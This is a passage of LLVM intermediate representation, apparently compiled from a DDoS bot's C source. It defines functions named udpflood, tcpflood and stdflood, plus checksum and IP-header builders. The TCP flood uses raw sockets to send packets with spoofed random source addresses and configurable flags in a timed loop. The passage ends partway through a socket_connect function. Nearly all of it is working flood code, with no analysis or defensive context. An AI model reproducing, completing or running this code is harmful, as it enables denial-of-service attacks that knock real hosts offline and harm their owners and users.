._crit_edge17.loopexit.unr-lcssa:                 ; preds = %.lr.ph16
  br label %._crit_edge17.loopexit

._crit_edge17.loopexit:                           ; preds = %.lr.ph16.prol.loopexit, %._crit_edge17.loopexit.unr-lcssa
  %.lcssa26 = phi i64 [ %.lcssa26.unr, %.lr.ph16.prol.loopexit ], [ %29, %._crit_edge17.loopexit.unr-lcssa ]
  %scevgep = getelementptr i16, i16* %0, i64 %6
  %32 = sub i32 %4, %7
  br label %._crit_edge17

._crit_edge17:                                    ; preds = %._crit_edge17.loopexit, %2
  %.010.lcssa = phi i16* [ %0, %2 ], [ %scevgep, %._crit_edge17.loopexit ]
  %.09.lcssa = phi i32 [ %1, %2 ], [ %32, %._crit_edge17.loopexit ]
  %.0.lcssa = phi i64 [ 0, %2 ], [ %.lcssa26, %._crit_edge17.loopexit ]
  %33 = icmp eq i32 %.09.lcssa, 1
  br i1 %33, label %34, label %.preheader

; <label>:34:                                     ; preds = %._crit_edge17
  %35 = bitcast i16* %.010.lcssa to i8*
  %36 = load i8, i8* %35, align 1
  %37 = zext i8 %36 to i64
  %38 = add i64 %37, %.0.lcssa
  br label %.preheader

.preheader:                                       ; preds = %34, %._crit_edge17
  %.1.ph = phi i64 [ %.0.lcssa, %._crit_edge17 ], [ %38, %34 ]
  %39 = lshr i64 %.1.ph, 16
  %40 = icmp eq i64 %39, 0
  br i1 %40, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %.preheader
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %41 = phi i64 [ %44, %.lr.ph ], [ %39, %.lr.ph.preheader ]
  %.111 = phi i64 [ %43, %.lr.ph ], [ %.1.ph, %.lr.ph.preheader ]
  %42 = and i64 %.111, 65535
  %43 = add nuw nsw i64 %42, %41
  %44 = lshr i64 %43, 16
  %45 = icmp eq i64 %44, 0
  br i1 %45, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %.preheader
  %.1.lcssa = phi i64 [ %.1.ph, %.preheader ], [ %43, %._crit_edge.loopexit ]
  %46 = trunc i64 %.1.lcssa to i16
  %47 = xor i16 %46, -1
  ret i16 %47
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @tcpcsum(%struct.iphdr* nocapture readonly, %struct.tcphdr* nocapture readonly) local_unnamed_addr #1 {
  %3 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 8
  %4 = load i32, i32* %3, align 4
  %5 = zext i32 %4 to i64
  %6 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 9
  %7 = load i32, i32* %6, align 4
  %8 = zext i32 %7 to i64
  %9 = tail call noalias i8* @malloc(i64 24) #8
  %10 = bitcast i8* %9 to i16*
  %.sroa.0.0..sroa_cast = bitcast i8* %9 to i64*
  store i64 %5, i64* %.sroa.0.0..sroa_cast, align 1
  %.sroa.2.0..sroa_idx6 = getelementptr inbounds i8, i8* %9, i64 8
  %.sroa.2.0..sroa_cast = bitcast i8* %.sroa.2.0..sroa_idx6 to i64*
  store i64 %8, i64* %.sroa.2.0..sroa_cast, align 1
  %.sroa.3.0..sroa_idx = getelementptr inbounds i8, i8* %9, i64 16
  store i8 0, i8* %.sroa.3.0..sroa_idx, align 1
  %.sroa.4.0..sroa_raw_idx = getelementptr inbounds i8, i8* %9, i64 17
  store i8 6, i8* %.sroa.4.0..sroa_raw_idx, align 1
  %11 = getelementptr inbounds i8, i8* %9, i64 24
  %12 = bitcast %struct.tcphdr* %1 to i8*
  tail call void @llvm.memcpy.p0i8.p0i8.i64(i8* %11, i8* %12, i64 20, i32 1, i1 false)
  %13 = tail call zeroext i16 @csum(i16* %10, i32 24)
  tail call void @free(i8* %9) #8
  ret i16 %13
}

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) local_unnamed_addr #4

; Function Attrs: argmemonly nounwind
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i32, i1) #5

; Function Attrs: nounwind
declare void @free(i8* nocapture) local_unnamed_addr #4

; Function Attrs: noinline norecurse nounwind uwtable
define void @makeIPPacket(%struct.iphdr* nocapture, i32, i32, i8 zeroext, i32) local_unnamed_addr #0 {
  %6 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 0
  store i8 69, i8* %6, align 4
  %7 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 1
  store i8 0, i8* %7, align 1
  %8 = trunc i32 %4 to i16
  %9 = add i16 %8, 20
  %10 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 2
  store i16 %9, i16* %10, align 2
  %11 = tail call i32 @rand_cmwc()
  %12 = trunc i32 %11 to i16
  %13 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 3
  store i16 %12, i16* %13, align 4
  %14 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 4
  store i16 0, i16* %14, align 2
  %15 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 5
  store i8 -1, i8* %15, align 4
  %16 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 6
  store i8 %3, i8* %16, align 1
  %17 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 7
  store i16 0, i16* %17, align 2
  %18 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 8
  store i32 %2, i32* %18, align 4
  %19 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 9
  store i32 %1, i32* %19, align 4
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @getHost(i8*, %struct.in_addr* nocapture) local_unnamed_addr #1 {
  %3 = tail call i32 @inet_addr(i8* %0) #8
  %4 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %1, i64 0, i32 0
  store i32 %3, i32* %4, align 4
  %5 = icmp eq i32 %3, -1
  %. = zext i1 %5 to i32
  ret i32 %.
}

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) local_unnamed_addr #4

; Function Attrs: noinline nounwind uwtable
define void @filter(i8* nocapture) local_unnamed_addr #1 {
  br label %2

; <label>:2:                                      ; preds = %.critedge, %1
  %3 = tail call i64 @strlen(i8* %0) #13
  %4 = add i64 %3, -1
  %5 = getelementptr inbounds i8, i8* %0, i64 %4
  %6 = load i8, i8* %5, align 1
  switch i8 %6, label %10 [
    i8 13, label %.critedge
    i8 10, label %.critedge
  ]

.critedge:                                        ; preds = %2, %2
  %7 = tail call i64 @strlen(i8* nonnull %0) #13
  %8 = add i64 %7, -1
  %9 = getelementptr inbounds i8, i8* %0, i64 %8
  store i8 0, i8* %9, align 1
  br label %2

; <label>:10:                                     ; preds = %2
  ret void
}

; Function Attrs: nounwind readonly
declare i64 @strlen(i8* nocapture) local_unnamed_addr #6

; Function Attrs: noinline nounwind uwtable
define noalias i8* @makestring() local_unnamed_addr #1 {
  %1 = alloca [1024 x i8], align 16
  %2 = tail call i32 @rand() #8
  %3 = srem i32 %2, 5
  %4 = add nsw i32 %3, 4
  %5 = add nsw i32 %3, 5
  %6 = sext i32 %5 to i64
  %7 = tail call noalias i8* @malloc(i64 %6) #8
  tail call void @llvm.memset.p0i8.i64(i8* %7, i8 0, i64 %6, i32 1, i1 false)
  %8 = tail call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.40, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.41, i64 0, i64 0))
  %9 = icmp eq %struct._IO_FILE* %8, null
  br i1 %9, label %.preheader, label %18

.preheader:                                       ; preds = %0
  %10 = icmp sgt i32 %3, -4
  br i1 %10, label %.lr.ph.preheader, label %.loopexit

.lr.ph.preheader:                                 ; preds = %.preheader
  %11 = sext i32 %4 to i64
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %indvars.iv = phi i64 [ 0, %.lr.ph.preheader ], [ %indvars.iv.next, %.lr.ph ]
  %12 = tail call i32 @rand() #8
  %13 = srem i32 %12, 26
  %14 = add nsw i32 %13, 65
  %15 = trunc i32 %14 to i8
  %16 = getelementptr inbounds i8, i8* %7, i64 %indvars.iv
  store i8 %15, i8* %16, align 1
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %17 = icmp slt i64 %indvars.iv.next, %11
  br i1 %17, label %.lr.ph, label %.loopexit.loopexit

; <label>:18:                                     ; preds = %0
  %19 = tail call i32 @rand() #8
  %20 = tail call i32 @rand() #8
  %21 = mul nsw i32 %20, %19
  %22 = srem i32 %21, 45402
  %23 = icmp slt i32 %22, 0
  %24 = getelementptr inbounds [1024 x i8], [1024 x i8]* %1, i64 0, i64 0
  br i1 %23, label %._crit_edge, label %.lr.ph18.preheader

.lr.ph18.preheader:                               ; preds = %18
  br label %.lr.ph18

.lr.ph18:                                         ; preds = %.lr.ph18.preheader, %.lr.ph18
  %.117 = phi i32 [ %26, %.lr.ph18 ], [ 0, %.lr.ph18.preheader ]
  %25 = call i8* @fgets(i8* nonnull %24, i32 1024, %struct._IO_FILE* nonnull %8)
  %26 = add nuw nsw i32 %.117, 1
  %exitcond = icmp eq i32 %.117, %22
  br i1 %exitcond, label %._crit_edge.loopexit, label %.lr.ph18

._crit_edge.loopexit:                             ; preds = %.lr.ph18
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %18
  call void @llvm.memset.p0i8.i64(i8* nonnull %24, i8 0, i64 1024, i32 16, i1 false)
  %27 = call i8* @fgets(i8* nonnull %24, i32 1024, %struct._IO_FILE* nonnull %8)
  call void @filter(i8* nonnull %24)
  %28 = sext i32 %4 to i64
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %7, i8* nonnull %24, i64 %28, i32 1, i1 false)
  %29 = call i32 @fclose(%struct._IO_FILE* nonnull %8)
  br label %.loopexit

.loopexit.loopexit:                               ; preds = %.lr.ph
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %.preheader, %._crit_edge
  ret i8* %7
}

; Function Attrs: nounwind
declare i32 @rand() local_unnamed_addr #4

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #5

; Function Attrs: nounwind
declare noalias %struct._IO_FILE* @fopen(i8* nocapture readonly, i8* nocapture readonly) local_unnamed_addr #4

; Function Attrs: nounwind
declare i8* @fgets(i8*, i32, %struct._IO_FILE* nocapture) local_unnamed_addr #4

; Function Attrs: nounwind
declare i32 @fclose(%struct._IO_FILE* nocapture) local_unnamed_addr #4

; Function Attrs: noinline nounwind uwtable
define void @udpflood(i8*, i32, i32, i32) local_unnamed_addr #1 {
  %5 = alloca %struct.sockaddr_in, align 4
  %6 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 0
  store i16 2, i16* %6, align 4
  %7 = icmp eq i32 %1, 0
  br i1 %7, label %8, label %11

; <label>:8:                                      ; preds = %4
  %9 = tail call i32 @rand_cmwc()
  %10 = trunc i32 %9 to i16
  br label %14

; <label>:11:                                     ; preds = %4
  %12 = trunc i32 %1 to i16
  %13 = tail call zeroext i16 @htons(i16 zeroext %12) #12
  br label %14

; <label>:14:                                     ; preds = %11, %8
  %.sink = phi i16 [ %13, %11 ], [ %10, %8 ]
  %15 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 1
  store i16 %.sink, i16* %15, align 2
  %16 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 2
  %17 = call i32 @getHost(i8* %0, %struct.in_addr* %16)
  %18 = icmp eq i32 %17, 0
  br i1 %18, label %19, label %.loopexit

; <label>:19:                                     ; preds = %14
  %20 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 3, i64 0
  %21 = bitcast i8* %20 to i64*
  store i64 0, i64* %21, align 4
  %22 = tail call i32 @socket(i32 2, i32 2, i32 17) #8
  %23 = icmp eq i32 %22, 0
  br i1 %23, label %.loopexit, label %24

; <label>:24:                                     ; preds = %19
  %25 = add nsw i32 %3, 1
  %26 = sext i32 %25 to i64
  %27 = tail call noalias i8* @malloc(i64 %26) #8
  %28 = icmp eq i8* %27, null
  br i1 %28, label %.loopexit, label %29

; <label>:29:                                     ; preds = %24
  tail call void @llvm.memset.p0i8.i64(i8* nonnull %27, i8 0, i64 %26, i32 1, i1 false)
  tail call void @makeRandomStr(i8* nonnull %27, i32 %3)
  %30 = tail call i64 @time(i64* null) #8
  %31 = zext i32 %2 to i64
  %32 = add i64 %30, %31
  %33 = sext i32 %3 to i64
  %34 = bitcast %struct.sockaddr_in* %5 to %struct.sockaddr*
  %sext = shl i64 %32, 32
  %35 = ashr exact i64 %sext, 32
  br label %.backedge

.backedge:                                        ; preds = %.backedge.backedge, %29
  %.058 = phi i32 [ 0, %29 ], [ %.058.be, %.backedge.backedge ]
  %36 = call i64 @sendto(i32 %22, i8* nonnull %27, i64 %33, i32 0, %struct.sockaddr* nonnull %34, i32 16) #8
  %37 = icmp eq i32 %.058, 10
  br i1 %37, label %38, label %45

; <label>:38:                                     ; preds = %.backedge
  br i1 %7, label %39, label %42

; <label>:39:                                     ; preds = %38
  %40 = call i32 @rand_cmwc()
  %41 = trunc i32 %40 to i16
  store i16 %41, i16* %15, align 2
  br label %42

; <label>:42:                                     ; preds = %39, %38
  %43 = call i64 @time(i64* null) #8
  %44 = icmp sgt i64 %43, %35
  br i1 %44, label %.loopexit.loopexit, label %.backedge.backedge

; <label>:45:                                     ; preds = %.backedge
  %46 = add i32 %.058, 1
  br label %.backedge.backedge

.backedge.backedge:                               ; preds = %45, %42
  %.058.be = phi i32 [ %46, %45 ], [ 0, %42 ]
  br label %.backedge

.loopexit.loopexit:                               ; preds = %42
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %19, %14, %24
  ret void
}

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) local_unnamed_addr #2

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) local_unnamed_addr #4

; Function Attrs: nounwind
declare i64 @time(i64*) local_unnamed_addr #4

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) local_unnamed_addr #7

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) local_unnamed_addr #4

; Function Attrs: nounwind
declare void @srand(i32) local_unnamed_addr #4

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #8

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) local_unnamed_addr #2

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #8

; Function Attrs: noinline nounwind uwtable
define void @tcpflood(i8*, i32, i32, i32, i8*) local_unnamed_addr #1 {
  %6 = alloca %struct.sockaddr_in, align 4
  %7 = alloca i32, align 4
  %8 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i64 0, i32 0
  store i16 2, i16* %8, align 4
  %9 = icmp eq i32 %1, 0
  br i1 %9, label %10, label %13

; <label>:10:                                     ; preds = %5
  %11 = tail call i32 @rand_cmwc()
  %12 = trunc i32 %11 to i16
  br label %16

; <label>:13:                                     ; preds = %5
  %14 = trunc i32 %1 to i16
  %15 = tail call zeroext i16 @htons(i16 zeroext %14) #12
  br label %16

; <label>:16:                                     ; preds = %13, %10
  %.sink = phi i16 [ %15, %13 ], [ %12, %10 ]
  %17 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i64 0, i32 1
  store i16 %.sink, i16* %17, align 2
  %18 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i64 0, i32 2
  %19 = call i32 @getHost(i8* %0, %struct.in_addr* %18)
  %20 = icmp eq i32 %19, 0
  br i1 %20, label %21, label %153

; <label>:21:                                     ; preds = %16
  %22 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i64 0, i32 3, i64 0
  %23 = bitcast i8* %22 to i64*
  store i64 0, i64* %23, align 4
  %24 = tail call i32 @socket(i32 2, i32 3, i32 6) #8
  %25 = icmp eq i32 %24, 0
  br i1 %25, label %153, label %26

; <label>:26:                                     ; preds = %21
  store i32 1, i32* %7, align 4
  %27 = bitcast i32* %7 to i8*
  %28 = call i32 @setsockopt(i32 %24, i32 0, i32 3, i8* nonnull %27, i32 4) #8
  %29 = icmp slt i32 %28, 0
  br i1 %29, label %153, label %30

; <label>:30:                                     ; preds = %26
  %31 = sext i32 %3 to i64
  %32 = add nsw i64 %31, 40
  %33 = call i8* @llvm.stacksave()
  %34 = alloca i8, i64 %32, align 16
  %35 = bitcast i8* %34 to %struct.iphdr*
  %36 = getelementptr i8, i8* %34, i64 20
  %37 = bitcast i8* %36 to %struct.tcphdr*
  %38 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %18, i64 0, i32 0
  %39 = load i32, i32* %38, align 4
  %40 = call i32 @getRandomIP(i32 -1)
  %41 = call i32 @htonl(i32 %40) #12
  %42 = add i32 %3, 20
  call void @makeIPPacket(%struct.iphdr* nonnull %35, i32 %39, i32 %41, i8 zeroext 6, i32 %42)
  %43 = call i32 @rand_cmwc()
  %44 = trunc i32 %43 to i16
  %45 = bitcast i8* %36 to i16*
  store i16 %44, i16* %45, align 4
  %46 = call i32 @rand_cmwc()
  %47 = getelementptr inbounds i8, i8* %34, i64 24
  %48 = bitcast i8* %47 to i32*
  store i32 %46, i32* %48, align 8
  %49 = getelementptr inbounds i8, i8* %34, i64 28
  %50 = bitcast i8* %49 to i32*
  store i32 0, i32* %50, align 4
  %51 = getelementptr inbounds i8, i8* %34, i64 32
  %52 = bitcast i8* %51 to i16*
  %53 = load i16, i16* %52, align 16
  %54 = and i16 %53, -241
  %55 = or i16 %54, 80
  store i16 %55, i16* %52, align 16
  %56 = call i32 @strcmp(i8* %4, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.42, i64 0, i64 0)) #13
  %57 = icmp eq i32 %56, 0
  br i1 %57, label %60, label %.preheader

.preheader:                                       ; preds = %30
  %58 = call i8* @strtok(i8* %4, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.43, i64 0, i64 0)) #8
  %59 = icmp eq i8* %58, null
  br i1 %59, label %.loopexit, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %.preheader
  br label %.lr.ph

; <label>:60:                                     ; preds = %30
  %61 = and i16 %53, -8177
  %62 = or i16 %61, 8016
  store i16 %62, i16* %52, align 16
  br label %.loopexit

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.backedge68
  %63 = phi i8* [ %75, %.backedge68 ], [ %58, %.lr.ph.preheader ]
  %64 = call i32 @strcmp(i8* nonnull %63, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.44, i64 0, i64 0)) #13
  %65 = icmp eq i32 %64, 0
  br i1 %65, label %66, label %69

; <label>:66:                                     ; preds = %.lr.ph
  %67 = load i16, i16* %52, align 16
  %68 = or i16 %67, 512
  store i16 %68, i16* %52, align 16
  br label %.backedge68

; <label>:69:                                     ; preds = %.lr.ph
  %70 = call i32 @strcmp(i8* nonnull %63, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.45, i64 0, i64 0)) #13
  %71 = icmp eq i32 %70, 0
  br i1 %71, label %72, label %77

; <label>:72:                                     ; preds = %69
  %73 = load i16, i16* %52, align 16
  %74 = or i16 %73, 1024
  store i16 %74, i16* %52, align 16
  br label %.backedge68

.backedge68:                                      ; preds = %72, %86, %95, %92, %80, %66
  %75 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.43, i64 0, i64 0)) #8
  %76 = icmp eq i8* %75, null
  br i1 %76, label %.loopexit.loopexit, label %.lr.ph

; <label>:77:                                     ; preds = %69
  %78 = call i32 @strcmp(i8* nonnull %63, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.46, i64 0, i64 0)) #13
  %79 = icmp eq i32 %78, 0
  br i1 %79, label %80, label %83

; <label>:80:                                     ; preds = %77
  %81 = load i16, i16* %52, align 16
  %82 = or i16 %81, 256
  store i16 %82, i16* %52, align 16
  br label %.backedge68

; <label>:83:                                     ; preds = %77
  %84 = call i32 @strcmp(i8* nonnull %63, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.47, i64 0, i64 0)) #13
  %85 = icmp eq i32 %84, 0
  br i1 %85, label %86, label %89

; <label>:86:                                     ; preds = %83
  %87 = load i16, i16* %52, align 16
  %88 = or i16 %87, 4096
  store i16 %88, i16* %52, align 16
  br label %.backedge68

; <label>:89:                                     ; preds = %83
  %90 = call i32 @strcmp(i8* nonnull %63, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.48, i64 0, i64 0)) #13
  %91 = icmp eq i32 %90, 0
  br i1 %91, label %92, label %95

; <label>:92:                                     ; preds = %89
  %93 = load i16, i16* %52, align 16
  %94 = or i16 %93, 2048
  store i16 %94, i16* %52, align 16
  br label %.backedge68

; <label>:95:                                     ; preds = %89
  %96 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.49, i64 0, i64 0), i8* nonnull %63)
  br label %.backedge68

.loopexit.loopexit:                               ; preds = %.backedge68
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %.preheader, %60
  %97 = call i32 @rand_cmwc()
  %98 = trunc i32 %97 to i16
  %99 = getelementptr inbounds i8, i8* %34, i64 34
  %100 = bitcast i8* %99 to i16*
  store i16 %98, i16* %100, align 2
  %101 = getelementptr inbounds i8, i8* %34, i64 36
  %102 = bitcast i8* %101 to i16*
  store i16 0, i16* %102, align 4
  %103 = getelementptr inbounds i8, i8* %34, i64 38
  %104 = bitcast i8* %103 to i16*
  store i16 0, i16* %104, align 2
  br i1 %9, label %105, label %107

; <label>:105:                                    ; preds = %.loopexit
  %106 = call i32 @rand_cmwc()
  br label %111

; <label>:107:                                    ; preds = %.loopexit
  %108 = trunc i32 %1 to i16
  %109 = call zeroext i16 @htons(i16 zeroext %108) #12
  %110 = zext i16 %109 to i32
  br label %111

; <label>:111:                                    ; preds = %107, %105
  %112 = phi i32 [ %106, %105 ], [ %110, %107 ]
  %113 = trunc i32 %112 to i16
  %114 = getelementptr inbounds i8, i8* %34, i64 22
  %115 = bitcast i8* %114 to i16*
  store i16 %113, i16* %115, align 2
  %116 = call zeroext i16 @tcpcsum(%struct.iphdr* nonnull %35, %struct.tcphdr* nonnull %37)
  store i16 %116, i16* %102, align 4
  %117 = bitcast i8* %34 to i16*
  %118 = getelementptr inbounds i8, i8* %34, i64 2
  %119 = bitcast i8* %118 to i16*
  %120 = load i16, i16* %119, align 2
  %121 = zext i16 %120 to i32
  %122 = call zeroext i16 @csum(i16* nonnull %117, i32 %121)
  %123 = getelementptr inbounds i8, i8* %34, i64 10
  %124 = bitcast i8* %123 to i16*
  store i16 %122, i16* %124, align 2
  %125 = call i64 @time(i64* null) #8
  %126 = zext i32 %2 to i64
  %127 = add i64 %125, %126
  %128 = bitcast %struct.sockaddr_in* %6 to %struct.sockaddr*
  %129 = getelementptr inbounds i8, i8* %34, i64 12
  %130 = bitcast i8* %129 to i32*
  %131 = getelementptr inbounds i8, i8* %34, i64 4
  %132 = bitcast i8* %131 to i16*
  %sext = shl i64 %127, 32
  %133 = ashr exact i64 %sext, 32
  br label %.backedge

.backedge:                                        ; preds = %.backedge.backedge, %111
  %.0 = phi i32 [ 0, %111 ], [ %.0.be, %.backedge.backedge ]
  %134 = call i64 @sendto(i32 %24, i8* nonnull %34, i64 %32, i32 0, %struct.sockaddr* nonnull %128, i32 16) #8
  %135 = call i32 @getRandomIP(i32 -1)
  %136 = call i32 @htonl(i32 %135) #12
  store i32 %136, i32* %130, align 4
  %137 = call i32 @rand_cmwc()
  %138 = trunc i32 %137 to i16
  store i16 %138, i16* %132, align 4
  %139 = call i32 @rand_cmwc()
  store i32 %139, i32* %48, align 8
  %140 = call i32 @rand_cmwc()
  %141 = trunc i32 %140 to i16
  store i16 %141, i16* %45, align 4
  store i16 0, i16* %102, align 4
  %142 = call zeroext i16 @tcpcsum(%struct.iphdr* nonnull %35, %struct.tcphdr* nonnull %37)
  store i16 %142, i16* %102, align 4
  %143 = load i16, i16* %119, align 2
  %144 = zext i16 %143 to i32
  %145 = call zeroext i16 @csum(i16* nonnull %117, i32 %144)
  store i16 %145, i16* %124, align 2
  %146 = icmp eq i32 %.0, 10
  br i1 %146, label %147, label %150

; <label>:147:                                    ; preds = %.backedge
  %148 = call i64 @time(i64* null) #8
  %149 = icmp sgt i64 %148, %133
  br i1 %149, label %152, label %.backedge.backedge

; <label>:150:                                    ; preds = %.backedge
  %151 = add i32 %.0, 1
  br label %.backedge.backedge

.backedge.backedge:                               ; preds = %150, %147
  %.0.be = phi i32 [ %151, %150 ], [ 0, %147 ]
  br label %.backedge

; <label>:152:                                    ; preds = %147
  call void @llvm.stackrestore(i8* %33)
  br label %153

; <label>:153:                                    ; preds = %21, %16, %26, %152
  ret void
}

; Function Attrs: nounwind readonly
declare i32 @strcmp(i8* nocapture, i8* nocapture) local_unnamed_addr #6

; Function Attrs: nounwind
declare i8* @strtok(i8*, i8* nocapture readonly) local_unnamed_addr #4

; Function Attrs: nounwind
declare i32 @printf(i8* nocapture readonly, ...) local_unnamed_addr #4

; Function Attrs: noinline noreturn nounwind uwtable
define void @stdflood(i8*, i32, i32, i32) local_unnamed_addr #9 {
  %5 = alloca %struct.sockaddr_in, align 4
  %6 = tail call i32 @socket(i32 2, i32 2, i32 0) #8
  %7 = tail call i64 @time(i64* null) #8
  %8 = tail call %struct.hostent* @gethostbyname(i8* %0) #8
  %9 = bitcast %struct.sockaddr_in* %5 to i8*
  call void @llvm.memset.p0i8.i64(i8* nonnull %9, i8 0, i64 16, i32 4, i1 false)
  %10 = getelementptr inbounds %struct.hostent, %struct.hostent* %8, i64 0, i32 4
  %11 = load i8**, i8*** %10, align 8
  %12 = load i8*, i8** %11, align 8
  %13 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 2
  %14 = bitcast %struct.in_addr* %13 to i8*
  %15 = getelementptr inbounds %struct.hostent, %struct.hostent* %8, i64 0, i32 3
  %16 = load i32, i32* %15, align 4
  %17 = sext i32 %16 to i64
  call void @bcopy(i8* %12, i8* %14, i64 %17) #8
  %18 = getelementptr inbounds %struct.hostent, %struct.hostent* %8, i64 0, i32 2
  %19 = load i32, i32* %18, align 8
  %20 = trunc i32 %19 to i16
  %21 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 0
  store i16 %20, i16* %21, align 4
  %22 = trunc i32 %1 to i16
  %23 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 1
  store i16 %22, i16* %23, align 2
  %24 = sext i32 %3 to i64
  %25 = bitcast %struct.sockaddr_in* %5 to %struct.sockaddr*
  %26 = sext i32 %2 to i64
  %27 = add nsw i64 %7, %26
  br label %28

; <label>:28:                                     ; preds = %38, %4
  %.0 = phi i32 [ 0, %4 ], [ %39, %38 ]
  %29 = icmp ugt i32 %.0, 49
  br i1 %29, label %30, label %38

; <label>:30:                                     ; preds = %28
  %31 = call i8* @makestring()
  %32 = call i64 @send(i32 %6, i8* %31, i64 %24, i32 0) #8
  %33 = call i32 @connect(i32 %6, %struct.sockaddr* nonnull %25, i32 16) #8
  %34 = call i64 @time(i64* null) #8
  %35 = icmp slt i64 %34, %27
  br i1 %35, label %38, label %36

; <label>:36:                                     ; preds = %30
  %37 = call i32 @close(i32 %6) #8
  call void @_exit(i32 0) #14
  unreachable

; <label>:38:                                     ; preds = %30, %28
  %.1 = phi i32 [ %.0, %28 ], [ 0, %30 ]
  %39 = add i32 %.1, 1
  br label %28
}

declare %struct.hostent* @gethostbyname(i8*) local_unnamed_addr #7

; Function Attrs: nounwind
declare void @bcopy(i8* nocapture readonly, i8* nocapture, i64) local_unnamed_addr #4

declare i64 @send(i32, i8*, i64, i32) local_unnamed_addr #7

declare i32 @connect(i32, %struct.sockaddr*, i32) local_unnamed_addr #7

declare i32 @close(i32) local_unnamed_addr #7

; Function Attrs: noreturn
declare void @_exit(i32) local_unnamed_addr #10

; Function Attrs: noinline nounwind uwtable
define i32 @socket_connect(i8*, i16 zeroext) local_unnamed_addr #1 {
  %3 = alloca %struct.sockaddr_in, align 4
  %4 = alloca i32, align 4
  store i32 1, i32* %4, align 4
  %5 = tail call %struct.hostent* @gethostbyname(i8* %0) #8
  %6 = icmp eq %struct.hostent* %5, null
  br i1 %6, label %7, label %8

; <label>:7:                                      ; preds = %2
  tail call void @herror(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.50, i64 0, i64 0)) #8
  tail call void @exit(i32 1) #14
  unreachable

; <label>:8:                                      ; preds = %2
  %9 = getelementptr inbounds %struct.hostent, %struct.hostent* %5, i64 0, i32 4
  %10 = load i8**, i8*** %9, align 8
  %11 = load i8*, i8** %10, align 8
  %12 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i64 0, i32 2
  %13 = bitcast %struct.in_addr* %12 to i8*
  %14 = getelementptr inbounds %struct.hostent, %struct.hostent* %5, i64 0, i32 3
  %15 = load i32, i32* %14, align 4
  %16 = sext i32 %15 to i64
  call void @bcopy(i8* %11, i8* %13, i64 %16) #8
  %17 = tail call zeroext i16 @htons(i16 zeroext %1) #12
